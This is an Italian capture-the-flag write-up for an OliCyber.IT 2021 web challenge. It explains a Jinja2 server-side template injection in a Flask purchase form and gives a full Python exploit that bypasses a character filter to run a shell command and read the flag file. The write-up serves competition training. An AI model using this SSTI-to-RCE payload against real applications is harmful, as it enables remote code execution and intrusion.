# OliCyber.IT 2021 - Competizione nazionale

## [web-02] FlagDownloader 2 (4 risoluzioni)

La versione gratuita non sempre è desiderabile, perché non pagare per avere la flag più velocemente?

Il nostro obiettivo è leggere il file `/flag.txt`.

### Soluzione

Giocando un po' con gli input nella pagina di acquisto si può arrivare a notare che il form è vulnerabile a una Server-Side Template Injection.

In particolare si può notare che se inseriamo come indirizzo il valore `{{ 7 * 7 }}` nella pagina di riepilogo ci viene mostrato `49`.

Con opportune verifiche si può trovare che il server è scritto in Python e utilizza il template engine Jinja2 con Flask.

Si può quindi costruire un payload che sfrutti questi prerequisiti per effettuare una RCE e leggere il file `/flag.txt`.

L'unica accortezza a cui fare attenzione è che il server blocca tutti i payload con i caratteri `_%'.\<>`, per cui bisogna ingegnarsi per bypassare i filtri.

### Exploit

Il seguente script usa Python per effettuare una richiesta contenente il payload della template injection.

```python
import requests, re, html

host = 'http://localhost:8080'

payload='{{[][config["FLAG"][61]*2 + "class" + config["FLAG"][61]*2][ config["FLAG"][61]*2 + "mro" + config["FLAG"][61]*2][1][config["FLAG"][61]*2+"subclasses"+config["FLAG"][61]*2]()[360]("cat /flag*",shell=True,stdout=-1)["communicate"]()[0]}}'

data = {
    'inputEmail': 'a@a.a',
    'inputPassword': 'a',
    'inputAddress': payload,
    'inputCreditCard': '123'
}

r = requests.post(host + '/premium', data=data)

m = re.search(r'<td>address</td> <td>(.*)</td>',r.text)

if m:
    print(html.unescape(m.group(1)))
else:
    print(r.text)
```
